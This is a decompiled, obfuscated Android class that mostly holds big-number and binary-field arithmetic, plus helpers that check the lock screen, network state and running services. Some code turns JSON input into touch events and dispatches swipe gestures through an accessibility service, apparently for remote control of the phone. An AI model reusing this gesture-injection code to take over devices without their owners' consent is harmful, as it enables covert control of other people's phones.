package defpackage;

import android.accessibilityservice.GestureDescription;
import android.app.ActivityManager;
import android.app.KeyguardManager;
import android.content.Context;
import android.content.Intent;
import android.content.res.Resources;
import android.graphics.Path;
import android.graphics.Rect;
import android.graphics.Typeface;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.ParcelFileDescriptor;
import android.os.PowerManager;
import android.os.Process;
import android.os.StrictMode;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityNodeInfo;
import com.mamimobi.AccessService;
import com.mamimobi.activity.WakeScreenActivity;
import io.nats.client.support.ApiConstants;
import java.io.ByteArrayOutputStream;
import java.io.Closeable;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.nio.MappedByteBuffer;
import java.nio.channels.FileChannel;
import java.util.Iterator;
import org.json.JSONException;
import org.json.JSONObject;

/* JADX INFO: loaded from: classes.dex */
public abstract class o80 implements zv0 {
    public static String a = null;
    public static String b = null;
    public static String c = null;
    public static String d = null;
    public static PowerManager.WakeLock e = null;
    public static boolean f = true;
    public static Method g;
    public static boolean h;
    public static final /* synthetic */ int i = 0;

    /* JADX WARN: Removed duplicated region for block: B:29:0x008b  */
    /* JADX WARN: Removed duplicated region for block: B:52:0x0138  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    public static void A(android.content.Context r7, org.json.JSONObject r8) {
        /*
            Method dump skipped, instruction units count: 321
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: defpackage.o80.A(android.content.Context, org.json.JSONObject):void");
    }

    public static final ju0 B(Object obj) {
        if (obj == l21.m) {
            throw new IllegalStateException("Does not contain segment");
        }
        t40.l(obj, "null cannot be cast to non-null type S of kotlinx.coroutines.internal.SegmentOrClosed");
        return (ju0) obj;
    }

    public static File C(Context context) {
        File cacheDir = context.getCacheDir();
        if (cacheDir == null) {
            return null;
        }
        String str = ".font" + Process.myPid() + "-" + Process.myTid() + "-";
        for (int i2 = 0; i2 < 100; i2++) {
            File file = new File(cacheDir, str + i2);
            if (file.createNewFile()) {
                return file;
            }
        }
        return null;
    }

    public static boolean D(int[] iArr, int[] iArr2) {
        for (int i2 = 5; i2 >= 0; i2--) {
            int i3 = iArr[i2] ^ Integer.MIN_VALUE;
            int i4 = Integer.MIN_VALUE ^ iArr2[i2];
            if (i3 < i4) {
                return false;
            }
            if (i3 > i4) {
                return true;
            }
        }
        return true;
    }

    public static void E(long[] jArr, long[] jArr2) {
        long j = jArr[0];
        long j2 = jArr[1];
        long j3 = jArr[2];
        long j4 = jArr[3];
        jArr2[0] = j & 562949953421311L;
        jArr2[1] = ((j >>> 49) ^ (j2 << 15)) & 562949953421311L;
        jArr2[2] = ((j2 >>> 34) ^ (j3 << 30)) & 562949953421311L;
        jArr2[3] = (j3 >>> 19) ^ (j4 << 45);
    }

    public static void F(long[] jArr, long[] jArr2, long[] jArr3) {
        long[] jArr4 = new long[4];
        long[] jArr5 = new long[4];
        E(jArr, jArr4);
        E(jArr2, jArr5);
        long[] jArr6 = new long[8];
        G(jArr6, jArr4[0], jArr5[0], jArr3, 0);
        G(jArr6, jArr4[1], jArr5[1], jArr3, 1);
        G(jArr6, jArr4[2], jArr5[2], jArr3, 2);
        G(jArr6, jArr4[3], jArr5[3], jArr3, 3);
        for (int i2 = 5; i2 > 0; i2--) {
            jArr3[i2] = jArr3[i2] ^ jArr3[i2 - 1];
        }
        G(jArr6, jArr4[0] ^ jArr4[1], jArr5[0] ^ jArr5[1], jArr3, 1);
        G(jArr6, jArr4[2] ^ jArr4[3], jArr5[2] ^ jArr5[3], jArr3, 3);
        for (int i3 = 7; i3 > 1; i3--) {
            jArr3[i3] = jArr3[i3] ^ jArr3[i3 - 2];
        }
        long j = jArr4[0] ^ jArr4[2];
        long j2 = jArr4[1] ^ jArr4[3];
        long j3 = jArr5[0] ^ jArr5[2];
        long j4 = jArr5[3] ^ jArr5[1];
        G(jArr6, j ^ j2, j3 ^ j4, jArr3, 3);
        long[] jArr7 = new long[3];
        G(jArr6, j, j3, jArr7, 0);
        G(jArr6, j2, j4, jArr7, 1);
        long j5 = jArr7[0];
        long j6 = jArr7[1];
        long j7 = jArr7[2];
        long j8 = jArr3[2] ^ j5;
        jArr3[2] = j8;
        long j9 = jArr3[3] ^ (j5 ^ j6);
        jArr3[3] = j9;
        long j10 = jArr3[4] ^ (j6 ^ j7);
        jArr3[4] = j10;
        long j11 = jArr3[5] ^ j7;
        jArr3[5] = j11;
        long j12 = jArr3[0];
        long j13 = jArr3[1];
        long j14 = jArr3[6];
        long j15 = jArr3[7];
        jArr3[0] = j12 ^ (j13 << 49);
        jArr3[1] = (j13 >>> 15) ^ (j8 << 34);
        jArr3[2] = (j8 >>> 30) ^ (j9 << 19);
        jArr3[3] = ((j9 >>> 45) ^ (j10 << 4)) ^ (j11 << 53);
        jArr3[4] = ((j10 >>> 60) ^ (j14 << 38)) ^ (j11 >>> 11);
        jArr3[5] = (j14 >>> 26) ^ (j15 << 23);
        jArr3[6] = j15 >>> 41;
        jArr3[7] = 0;
    }

    public static void G(long[] jArr, long j, long j2, long[] jArr2, int i2) {
        jArr[1] = j2;
        long j3 = j2 << 1;
        jArr[2] = j3;
        long j4 = j3 ^ j2;
        jArr[3] = j4;
        long j5 = j2 << 2;
        jArr[4] = j5;
        jArr[5] = j5 ^ j2;
        long j6 = j4 << 1;
        jArr[6] = j6;
        jArr[7] = j6 ^ j2;
        int i3 = (int) j;
        long j7 = (jArr[(i3 >>> 3) & 7] << 3) ^ jArr[i3 & 7];
        long j8 = 0;
        int i4 = 36;
        do {
            int i5 = (int) (j >>> i4);
            long j9 = (((jArr[i5 & 7] ^ (jArr[(i5 >>> 3) & 7] << 3)) ^ (jArr[(i5 >>> 6) & 7] << 6)) ^ (jArr[(i5 >>> 9) & 7] << 9)) ^ (jArr[(i5 >>> 12) & 7] << 12);
            j7 ^= j9 << i4;
            j8 ^= j9 >>> (-i4);
            i4 -= 15;
        } while (i4 > 0);
        jArr2[i2] = jArr2[i2] ^ (562949953421311L & j7);
        int i6 = i2 + 1;
        jArr2[i6] = jArr2[i6] ^ ((j7 >>> 49) ^ (j8 << 15));
    }

    public static void H(long[] jArr, long[] jArr2) {
        qm.o(3, jArr, jArr2);
        jArr2[6] = jArr[3] & 1;
    }

    public static final boolean I(Object obj) {
        return obj == l21.m;
    }

    public static boolean J(Context context) {
        if (context == null) {
            return true;
        }
        try {
            KeyguardManager keyguardManager = (KeyguardManager) context.getSystemService("keyguard");
            if (keyguardManager != null) {
                return keyguardManager.isKeyguardLocked();
            }
            return false;
        } catch (Exception unused) {
            return true;
        }
    }

    public static boolean K(Context context) {
        NetworkInfo activeNetworkInfo;
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService("connectivity");
        return (connectivityManager == null || (activeNetworkInfo = connectivityManager.getActiveNetworkInfo()) == null || !activeNetworkInfo.isConnected()) ? false : true;
    }

    public static boolean L(int[] iArr) {
        if (iArr[0] != 1) {
            return false;
        }
        for (int i2 = 1; i2 < 6; i2++) {
            if (iArr[i2] != 0) {
                return false;
            }
        }
        return true;
    }

    public static boolean M(long[] jArr) {
        if (jArr[0] != 1) {
            return false;
        }
        for (int i2 = 1; i2 < 3; i2++) {
            if (jArr[i2] != 0) {
                return false;
            }
        }
        return true;
    }

    public static boolean N(Context context, Class cls) {
        Iterator<ActivityManager.RunningServiceInfo> it = ((ActivityManager) context.getSystemService("activity")).getRunningServices(Integer.MAX_VALUE).iterator();
        while (it.hasNext()) {
            if (cls.getName().equals(it.next().service.getClassName())) {
                return true;
            }
        }
        return false;
    }

    public static boolean O(int[] iArr) {
        for (int i2 = 0; i2 < 6; i2++) {
            if (iArr[i2] != 0) {
                return false;
            }
        }
        return true;
    }

    public static boolean P(long[] jArr) {
        for (int i2 = 0; i2 < 3; i2++) {
            if (jArr[i2] != 0) {
                return false;
            }
        }
        return true;
    }

    public static MotionEvent Q(JSONObject jSONObject) {
        try {
            int i2 = jSONObject.getInt(ApiConstants.ACTION);
            jSONObject.getInt("actionIndex");
            jSONObject.getInt("actionMasked");
            long j = jSONObject.getLong("downTime");
            long j2 = jSONObject.getLong("eventTime");
            int i3 = jSONObject.getInt("pointerCount");
            MotionEvent.PointerProperties[] pointerPropertiesArr = new MotionEvent.PointerProperties[i3];
            MotionEvent.PointerCoords[] pointerCoordsArr = new MotionEvent.PointerCoords[i3];
            for (int i4 = 0; i4 < i3; i4++) {
                JSONObject jSONObject2 = jSONObject.getJSONObject("pointer_" + i4);
                int i5 = jSONObject2.getInt("pointerId");
                MotionEvent.PointerProperties pointerProperties = new MotionEvent.PointerProperties();
                pointerProperties.id = i5;
                pointerPropertiesArr[i4] = pointerProperties;
                MotionEvent.PointerCoords pointerCoords = new MotionEvent.PointerCoords();
                pointerCoords.x = (float) jSONObject2.getDouble("x");
                pointerCoords.y = (float) jSONObject2.getDouble("y");
                pointerCoords.pressure = (float) jSONObject2.getDouble("pressure");
                pointerCoords.size = (float) jSONObject2.getDouble(ApiConstants.SIZE);
                pointerCoordsArr[i4] = pointerCoords;
            }
            MotionEvent motionEventObtain = MotionEvent.obtain(j, j2, i2, i3, pointerPropertiesArr, pointerCoordsArr, 0, 0, 1.0f, 1.0f, 0, 0, 0, 0);
            motionEventObtain.setAction(i2);
            return motionEventObtain;
        } catch (JSONException e2) {
            e2.printStackTrace();
            return null;
        }
    }

    public static float R(float f2, float f3, float f4) {
        return (f4 * f3) + ((1.0f - f4) * f2);
    }

    public static MappedByteBuffer S(Context context, Uri uri) {
        ParcelFileDescriptor parcelFileDescriptorOpenFileDescriptor;
        try {
            parcelFileDescriptorOpenFileDescriptor = context.getContentResolver().openFileDescriptor(uri, "r", null);
        } catch (IOException unused) {
        }
        if (parcelFileDescriptorOpenFileDescriptor == null) {
            if (parcelFileDescriptorOpenFileDescriptor != null) {
                parcelFileDescriptorOpenFileDescriptor.close();
                return null;
            }
            return null;
        }
        try {
            FileInputStream fileInputStream = new FileInputStream(parcelFileDescriptorOpenFileDescriptor.getFileDescriptor());
            try {
                FileChannel channel = fileInputStream.getChannel();
                MappedByteBuffer map = channel.map(FileChannel.MapMode.READ_ONLY, 0L, channel.size());
                fileInputStream.close();
                parcelFileDescriptorOpenFileDescriptor.close();
                return map;
            } finally {
            }
        } finally {
        }
    }

    public static void T(int[] iArr, int[] iArr2, int[] iArr3) {
        long j = ((long) iArr2[0]) & 4294967295L;
        long j2 = ((long) iArr2[1]) & 4294967295L;
        long j3 = ((long) iArr2[2]) & 4294967295L;
        long j4 = ((long) iArr2[3]) & 4294967295L;
        long j5 = ((long) iArr2[4]) & 4294967295L;
        long j6 = ((long) iArr2[5]) & 4294967295L;
        int i2 = 1;
        long j7 = ((long) iArr[0]) & 4294967295L;
        long j8 = j7 * j;
        iArr3[0] = (int) j8;
        long j9 = (j7 * j2) + (j8 >>> 32);
        iArr3[1] = (int) j9;
        long j10 = (j7 * j3) + (j9 >>> 32);
        iArr3[2] = (int) j10;
        long j11 = (j7 * j4) + (j10 >>> 32);
        iArr3[3] = (int) j11;
        long j12 = (j7 * j5) + (j11 >>> 32);
        iArr3[4] = (int) j12;
        long j13 = (j7 * j6) + (j12 >>> 32);
        iArr3[5] = (int) j13;
        int i3 = 6;
        iArr3[6] = (int) (j13 >>> 32);
        while (true) {
            int i4 = i2;
            if (i4 >= i3) {
                return;
            }
            long j14 = ((long) iArr[i4]) & 4294967295L;
            long j15 = (j14 * j) + (((long) iArr3[i4]) & 4294967295L);
            iArr3[i4] = (int) j15;
            i2 = i4 + 1;
            long j16 = j5;
            long j17 = (j14 * j2) + (((long) iArr3[i2]) & 4294967295L) + (j15 >>> 32);
            iArr3[i2] = (int) j17;
            int i5 = i4 + 2;
            long j18 = (j14 * j3) + (((long) iArr3[i5]) & 4294967295L) + (j17 >>> 32);
            iArr3[i5] = (int) j18;
            int i6 = i4 + 3;
            long j19 = (j14 * j4) + (((long) iArr3[i6]) & 4294967295L) + (j18 >>> 32);
            iArr3[i6] = (int) j19;
            int i7 = i4 + 4;
            long j20 = (j14 * j16) + (((long) iArr3[i7]) & 4294967295L) + (j19 >>> 32);
            iArr3[i7] = (int) j20;
            int i8 = i4 + 5;
            long j21 = (j14 * j6) + (((long) iArr3[i8]) & 4294967295L) + (j20 >>> 32);
            iArr3[i8] = (int) j21;
            iArr3[i4 + 6] = (int) (j21 >>> 32);
            j5 = j16;
            i3 = 6;
        }
    }

    public static int U(int[] iArr, int[] iArr2, int[] iArr3) {
        int i2 = 0;
        long j = ((long) iArr2[0]) & 4294967295L;
        long j2 = ((long) iArr2[1]) & 4294967295L;
        long j3 = ((long) iArr2[2]) & 4294967295L;
        long j4 = ((long) iArr2[3]) & 4294967295L;
        long j5 = ((long) iArr2[4]) & 4294967295L;
        long j6 = ((long) iArr2[5]) & 4294967295L;
        long j7 = 0;
        while (i2 < 6) {
            long j8 = j;
            int i3 = i2;
            long j9 = ((long) iArr[i2]) & 4294967295L;
            long j10 = (((long) iArr3[i3]) & 4294967295L) + (j9 * j8);
            iArr3[i3] = (int) j10;
            int i4 = i3 + 1;
            long j11 = (j9 * j2) + (((long) iArr3[i4]) & 4294967295L) + (j10 >>> 32);
            iArr3[i4] = (int) j11;
            int i5 = i3 + 2;
            long j12 = (j9 * j3) + (((long) iArr3[i5]) & 4294967295L) + (j11 >>> 32);
            iArr3[i5] = (int) j12;
            int i6 = i3 + 3;
            long j13 = (j9 * j4) + (((long) iArr3[i6]) & 4294967295L) + (j12 >>> 32);
            iArr3[i6] = (int) j13;
            int i7 = i3 + 4;
            long j14 = (j9 * j5) + (((long) iArr3[i7]) & 4294967295L) + (j13 >>> 32);
            iArr3[i7] = (int) j14;
            int i8 = i3 + 5;
            long j15 = (j9 * j6) + (((long) iArr3[i8]) & 4294967295L) + (j14 >>> 32);
            iArr3[i8] = (int) j15;
            int i9 = i3 + 6;
            long j16 = (j15 >>> 32) + (((long) iArr3[i9]) & 4294967295L) + j7;
            iArr3[i9] = (int) j16;
            j7 = j16 >>> 32;
            i2 = i4;
            j = j8;
        }
        return (int) j7;
    }

    public static void V(long[] jArr, long[] jArr2, long[] jArr3) {
        long[] jArr4 = new long[8];
        F(jArr, jArr2, jArr4);
        Z(jArr4, jArr3);
    }

    public static void Z(long[] jArr, long[] jArr2) {
        long j = jArr[0];
        long j2 = jArr[1];
        long j3 = jArr[2];
        long j4 = jArr[3];
        long j5 = jArr[4];
        long j6 = jArr[5];
        long j7 = jArr[6];
        long j8 = j5 ^ (j7 >>> 50);
        long j9 = (j4 ^ ((j7 >>> 1) ^ (j7 << 14))) ^ (j6 >>> 50);
        long j10 = j ^ (j8 << 63);
        long j11 = (j2 ^ (j6 << 63)) ^ ((j8 >>> 1) ^ (j8 << 14));
        long j12 = ((j3 ^ (j7 << 63)) ^ ((j6 >>> 1) ^ (j6 << 14))) ^ (j8 >>> 50);
        long j13 = j9 >>> 1;
        jArr2[0] = (j10 ^ j13) ^ (j13 << 15);
        jArr2[1] = (j9 >>> 50) ^ j11;
        jArr2[2] = j12;
        jArr2[3] = 1 & j9;
    }

    public static int a(int[] iArr, int[] iArr2, int[] iArr3) {
        long j = (((long) iArr[0]) & 4294967295L) + (((long) iArr2[0]) & 4294967295L);
        iArr3[0] = (int) j;
        long j2 = (((long) iArr[1]) & 4294967295L) + (((long) iArr2[1]) & 4294967295L) + (j >>> 32);
        iArr3[1] = (int) j2;
        long j3 = (((long) iArr[2]) & 4294967295L) + (((long) iArr2[2]) & 4294967295L) + (j2 >>> 32);
        iArr3[2] = (int) j3;
        long j4 = (((long) iArr[3]) & 4294967295L) + (((long) iArr2[3]) & 4294967295L) + (j3 >>> 32);
        iArr3[3] = (int) j4;
        long j5 = (((long) iArr[4]) & 4294967295L) + (((long) iArr2[4]) & 4294967295L) + (j4 >>> 32);
        iArr3[4] = (int) j5;
        long j6 = (((long) iArr[5]) & 4294967295L) + (((long) iArr2[5]) & 4294967295L) + (j5 >>> 32);
        iArr3[5] = (int) j6;
        return (int) (j6 >>> 32);
    }

    /* JADX WARN: Failed to find 'out' block for switch in B:20:0x005b. Please report as an issue. */
    public static void a0(AccessService accessService, String str) {
        int i2;
        int i3;
        int i4;
        int i5;
        int i6;
        int i7;
        int i8 = 1;
        DisplayMetrics displayMetrics = new DisplayMetrics();
        ((WindowManager) accessService.getSystemService("window")).getDefaultDisplay().getRealMetrics(displayMetrics);
        Path path = new Path();
        i2 = displayMetrics.widthPixels / 2;
        int i9 = displayMetrics.heightPixels;
        i3 = (i9 * 2) / 3;
        i4 = i9 / 3;
        str.getClass();
        switch (str) {
            case "UP":
                i5 = i3 - i4;
                i6 = i5;
                i7 = i2;
                break;
            case "DOWN":
                i5 = i4 + i3;
                i6 = i5;
                i7 = i2;
                break;
            case "LEFT":
                i7 = i2 - i4;
                i6 = i3;
                break;
            case "RIGHT":
                i7 = i4 + i2;
                i6 = i3;
                break;
            default:
                i7 = i2;
                i6 = i3;
                break;
        }
        int iMax = Math.max(1, Math.min(i7, displayMetrics.widthPixels - 2));
        int iMax2 = Math.max(1, Math.min(i6, displayMetrics.heightPixels - 2));
        path.moveTo(i2, i3);
        path.lineTo(iMax, iMax2);
        AccessibilityNodeInfo rootInActiveWindow = accessService.getRootInActiveWindow();
        accessService.dispatchGesture(new GestureDescription.Builder().addStroke((rootInActiveWindow == null || rootInActiveWindow.getPackageName() == null || !((str.equals("UP") || str.equals("DOWN")) && ("com.android.launcher".equals(rootInActiveWindow.getPackageName()) || "com.google.android.apps.nexuslauncher".equals(rootInActiveWindow.getPackageName()) || "com.hihonor.android.launcher".equals(rootInActiveWindow.getPackageName()) || "com.sec.android.app.launcher".equals(rootInActiveWindow.getPackageName()) || "com.oppo.launcher".equals(rootInActiveWindow.getPackageName()) || "com.bbk.launcher2".equals(rootInActiveWindow.getPackageName()) || "com.huawei.android.launcher".equals(rootInActiveWindow.getPackageName()) || "com.miui.home".equals(rootInActiveWindow.getPackageName())))) ? new GestureDescription.StrokeDescription(path, 0L, 300L) : new GestureDescription.StrokeDescription(path, 0L, 60L)).build(), new vm0(i8), new Handler(Looper.getMainLooper()));
    }

    public static int b(int[] iArr, int[] iArr2, int[] iArr3) {
        long j = (((long) iArr[0]) & 4294967295L) + (((long) iArr2[0]) & 4294967295L) + (((long) iArr3[0]) & 4294967295L);
        iArr3[0] = (int) j;
        long j2 = (((long) iArr[1]) & 4294967295L) + (((long) iArr2[1]) & 4294967295L) + (((long) iArr3[1]) & 4294967295L) + (j >>> 32);
        iArr3[1] = (int) j2;
        long j3 = (((long) iArr[2]) & 4294967295L) + (((long) iArr2[2]) & 4294967295L) + (((long) iArr3[2]) & 4294967295L) + (j2 >>> 32);
        iArr3[2] = (int) j3;
        long j4 = (((long) iArr[3]) & 4294967295L) + (((long) iArr2[3]) & 4294967295L) + (((long) iArr3[3]) & 4294967295L) + (j3 >>> 32);
        iArr3[3] = (int) j4;
        long j5 = (((long) iArr[4]) & 4294967295L) + (((long) iArr2[4]) & 4294967295L) + (((long) iArr3[4]) & 4294967295L) + (j4 >>> 32);
        iArr3[4] = (int) j5;
        long j6 = (((long) iArr[5]) & 4294967295L) + (((long) iArr2[5]) & 4294967295L) + (((long) iArr3[5]) & 4294967295L) + (j5 >>> 32);
        iArr3[5] = (int) j6;
        return (int) (j6 >>> 32);
    }

    public static void b0(int[] iArr, int[] iArr2) {
        long j = ((long) iArr[0]) & 4294967295L;
        int i2 = 12;
        int i3 = 0;
        int i4 = 5;
        while (true) {
            int i5 = i4 - 1;
            long j2 = ((long) iArr[i4]) & 4294967295L;
            long j3 = j2 * j2;
            iArr2[i2 - 1] = (i3 << 31) | ((int) (j3 >>> 33));
            i2 -= 2;
            iArr2[i2] = (int) (j3 >>> 1);
            i3 = (int) j3;
            if (i5 <= 0) {
                long j4 = j * j;
                long j5 = (j4 >>> 33) | (((long) (i3 << 31)) & 4294967295L);
                iArr2[0] = (int) j4;
                int i6 = ((int) (j4 >>> 32)) & 1;
                long j6 = ((long) iArr[1]) & 4294967295L;
                long j7 = ((long) iArr2[2]) & 4294967295L;
                long j8 = (j6 * j) + j5;
                int i7 = (int) j8;
                iArr2[1] = i6 | (i7 << 1);
                long j9 = ((long) iArr[2]) & 4294967295L;
                long j10 = ((long) iArr2[3]) & 4294967295L;
                long j11 = ((long) iArr2[4]) & 4294967295L;
                long j12 = (j9 * j) + j7 + (j8 >>> 32);
                int i8 = (int) j12;
                iArr2[2] = (i8 << 1) | (i7 >>> 31);
                long jE = zn.e(j9, j6, j12 >>> 32, j10);
                long j13 = j11 + (jE >>> 32);
                long j14 = ((long) iArr[3]) & 4294967295L;
                long j15 = (((long) iArr2[5]) & 4294967295L) + (j13 >>> 32);
                long j16 = j13 & 4294967295L;
                long j17 = (((long) iArr2[6]) & 4294967295L) + (j15 >>> 32);
                long j18 = j15 & 4294967295L;
                long j19 = (j14 * j) + (jE & 4294967295L);
                int i9 = (int) j19;
                iArr2[3] = (i8 >>> 31) | (i9 << 1);
                int i10 = i9 >>> 31;
                long jE2 = zn.e(j14, j6, j19 >>> 32, j16);
                long jE3 = zn.e(j14, j9, jE2 >>> 32, j18);
                long j20 = j17 + (jE3 >>> 32);
                long j21 = ((long) iArr[4]) & 4294967295L;
                long j22 = (((long) iArr2[7]) & 4294967295L) + (j20 >>> 32);
                long j23 = j20 & 4294967295L;
                long j24 = (((long) iArr2[8]) & 4294967295L) + (j22 >>> 32);
                long j25 = j22 & 4294967295L;
                long j26 = (j21 * j) + (jE2 & 4294967295L);
                int i11 = (int) j26;
                iArr2[4] = i10 | (i11 << 1);
                int i12 = i11 >>> 31;
                long jE4 = zn.e(j21, j6, j26 >>> 32, jE3 & 4294967295L);
                long jE5 = zn.e(j21, j9, jE4 >>> 32, j23);
                long jE6 = zn.e(j21, j14, jE5 >>> 32, j25);
                long j27 = j24 + (jE6 >>> 32);
                long j28 = ((long) iArr[5]) & 4294967295L;
                long j29 = (((long) iArr2[9]) & 4294967295L) + (j27 >>> 32);
                long j30 = j27 & 4294967295L;
                long j31 = (((long) iArr2[10]) & 4294967295L) + (j29 >>> 32);
                long j32 = j29 & 4294967295L;
                long j33 = (j28 * j) + (jE4 & 4294967295L);
                int i13 = (int) j33;
                iArr2[5] = i12 | (i13 << 1);
                int i14 = i13 >>> 31;
                long jE7 = zn.e(j28, j6, j33 >>> 32, jE5 & 4294967295L);
                long jE8 = zn.e(j28, j9, jE7 >>> 32, jE6 & 4294967295L);
                long jE9 = zn.e(j28, j14, jE8 >>> 32, j30);
                long jE10 = zn.e(j28, j21, jE9 >>> 32, j32);
                long j34 = j31 + (jE10 >>> 32);
                int i15 = (int) jE7;
                iArr2[6] = (i15 << 1) | i14;
                int i16 = (int) jE8;
                iArr2[7] = (i15 >>> 31) | (i16 << 1);
                int i17 = i16 >>> 31;
                int i18 = (int) jE9;
                iArr2[8] = i17 | (i18 << 1);
                int i19 = i18 >>> 31;
                int i20 = (int) jE10;
                iArr2[9] = i19 | (i20 << 1);
                int i21 = i20 >>> 31;
                int i22 = (int) j34;
                iArr2[10] = i21 | (i22 << 1);
                iArr2[11] = ((iArr2[11] + ((int) (j34 >>> 32))) << 1) | (i22 >>> 31);
                return;
            }
            i4 = i5;
        }
    }

    public static void c0(int i2, long[] jArr, long[] jArr2) {
        long[] jArr3 = new long[8];
        H(jArr, jArr3);
        while (true) {
            Z(jArr3, jArr2);
            i2--;
            if (i2 <= 0) {
                return;
            } else {
                H(jArr2, jArr3);
            }
        }
    }

    public static int d0(int[] iArr, int[] iArr2, int[] iArr3) {
        long j = (((long) iArr[0]) & 4294967295L) - (((long) iArr2[0]) & 4294967295L);
        iArr3[0] = (int) j;
        long j2 = ((((long) iArr[1]) & 4294967295L) - (((long) iArr2[1]) & 4294967295L)) + (j >> 32);
        iArr3[1] = (int) j2;
        long j3 = ((((long) iArr[2]) & 4294967295L) - (((long) iArr2[2]) & 4294967295L)) + (j2 >> 32);
        iArr3[2] = (int) j3;
        long j4 = ((((long) iArr[3]) & 4294967295L) - (((long) iArr2[3]) & 4294967295L)) + (j3 >> 32);
        iArr3[3] = (int) j4;
        long j5 = ((((long) iArr[4]) & 4294967295L) - (((long) iArr2[4]) & 4294967295L)) + (j4 >> 32);
        iArr3[4] = (int) j5;
        long j6 = ((((long) iArr[5]) & 4294967295L) - (((long) iArr2[5]) & 4294967295L)) + (j5 >> 32);
        iArr3[5] = (int) j6;
        return (int) (j6 >> 32);
    }

    public static void e(long[] jArr, long[] jArr2, long[] jArr3) {
        jArr3[0] = jArr[0] ^ jArr2[0];
        jArr3[1] = jArr[1] ^ jArr2[1];
        jArr3[2] = jArr[2] ^ jArr2[2];
        jArr3[3] = jArr[3] ^ jArr2[3];
        jArr3[4] = jArr[4] ^ jArr2[4];
        jArr3[5] = jArr[5] ^ jArr2[5];
        jArr3[6] = jArr2[6] ^ jArr[6];
    }

    public static void e0(int[] iArr, int i2, int[] iArr2, int i3, int[] iArr3) {
        long j = (((long) iArr[i2]) & 4294967295L) - (((long) iArr2[i3]) & 4294967295L);
        iArr3[0] = (int) j;
        long j2 = ((((long) iArr[i2 + 1]) & 4294967295L) - (((long) iArr2[i3 + 1]) & 4294967295L)) + (j >> 32);
        iArr3[1] = (int) j2;
        long j3 = ((((long) iArr[i2 + 2]) & 4294967295L) - (((long) iArr2[i3 + 2]) & 4294967295L)) + (j2 >> 32);
        iArr3[2] = (int) j3;
        long j4 = ((((long) iArr[i2 + 3]) & 4294967295L) - (((long) iArr2[i3 + 3]) & 4294967295L)) + (j3 >> 32);
        iArr3[3] = (int) j4;
        long j5 = ((((long) iArr[i2 + 4]) & 4294967295L) - (((long) iArr2[i3 + 4]) & 4294967295L)) + (j4 >> 32);
        iArr3[4] = (int) j5;
        iArr3[5] = (int) (((((long) iArr[i2 + 5]) & 4294967295L) - (((long) iArr2[i3 + 5]) & 4294967295L)) + (j5 >> 32));
    }

    public static int f(int i2, int i3, int i4, int[] iArr, int[] iArr2) {
        long j = (((long) iArr[i2]) & 4294967295L) + (((long) iArr2[i3]) & 4294967295L) + (((long) i4) & 4294967295L);
        iArr2[i3] = (int) j;
        int i5 = i3 + 1;
        long j2 = (((long) iArr[i2 + 1]) & 4294967295L) + (((long) iArr2[i5]) & 4294967295L) + (j >>> 32);
        iArr2[i5] = (int) j2;
        int i6 = i3 + 2;
        long j3 = (((long) iArr[i2 + 2]) & 4294967295L) + (((long) iArr2[i6]) & 4294967295L) + (j2 >>> 32);
        iArr2[i6] = (int) j3;
        int i7 = i3 + 3;
        long j4 = (((long) iArr[i2 + 3]) & 4294967295L) + (((long) iArr2[i7]) & 4294967295L) + (j3 >>> 32);
        iArr2[i7] = (int) j4;
        int i8 = i3 + 4;
        long j5 = (((long) iArr[i2 + 4]) & 4294967295L) + (((long) iArr2[i8]) & 4294967295L) + (j4 >>> 32);
        iArr2[i8] = (int) j5;
        int i9 = i3 + 5;
        long j6 = (((long) iArr[i2 + 5]) & 4294967295L) + (4294967295L & ((long) iArr2[i9])) + (j5 >>> 32);
        iArr2[i9] = (int) j6;
        return (int) (j6 >>> 32);
    }

    public static void f0(int[] iArr, int[] iArr2) {
        long j = (((long) iArr2[0]) & 4294967295L) - (((long) iArr[0]) & 4294967295L);
        iArr2[0] = (int) j;
        long j2 = ((((long) iArr2[1]) & 4294967295L) - (((long) iArr[1]) & 4294967295L)) + (j >> 32);
        iArr2[1] = (int) j2;
        long j3 = ((((long) iArr2[2]) & 4294967295L) - (((long) iArr[2]) & 4294967295L)) + (j2 >> 32);
        iArr2[2] = (int) j3;
        long j4 = ((((long) iArr2[3]) & 4294967295L) - (((long) iArr[3]) & 4294967295L)) + (j3 >> 32);
        iArr2[3] = (int) j4;
        long j5 = ((((long) iArr2[4]) & 4294967295L) - (((long) iArr[4]) & 4294967295L)) + (j4 >> 32);
        iArr2[4] = (int) j5;
        iArr2[5] = (int) (((((long) iArr2[5]) & 4294967295L) - (4294967295L & ((long) iArr[5]))) + (j5 >> 32));
    }

    public static int g(int[] iArr, int[] iArr2) {
        long j = (((long) iArr[6]) & 4294967295L) + (((long) iArr2[12]) & 4294967295L);
        int i2 = (int) j;
        iArr[6] = i2;
        iArr2[12] = i2;
        long j2 = (((long) iArr[7]) & 4294967295L) + (((long) iArr2[13]) & 4294967295L) + (j >>> 32);
        int i3 = (int) j2;
        iArr[7] = i3;
        iArr2[13] = i3;
        long j3 = (((long) iArr[8]) & 4294967295L) + (((long) iArr2[14]) & 4294967295L) + (j2 >>> 32);
        int i4 = (int) j3;
        iArr[8] = i4;
        iArr2[14] = i4;
        long j4 = (((long) iArr[9]) & 4294967295L) + (((long) iArr2[15]) & 4294967295L) + (j3 >>> 32);
        int i5 = (int) j4;
        iArr[9] = i5;
        iArr2[15] = i5;
        long j5 = (((long) iArr[10]) & 4294967295L) + (((long) iArr2[16]) & 4294967295L) + (j4 >>> 32);
        int i6 = (int) j5;
        iArr[10] = i6;
        iArr2[16] = i6;
        long j6 = (((long) iArr[11]) & 4294967295L) + (4294967295L & ((long) iArr2[17])) + (j5 >>> 32);
        int i7 = (int) j6;
        iArr[11] = i7;
        iArr2[17] = i7;
        return (int) (j6 >>> 32);
    }

    public static void g0(ViewGroup viewGroup, boolean z) {
        if (Build.VERSION.SDK_INT >= 29) {
            l51.b(viewGroup, z);
        } else if (f) {
            try {
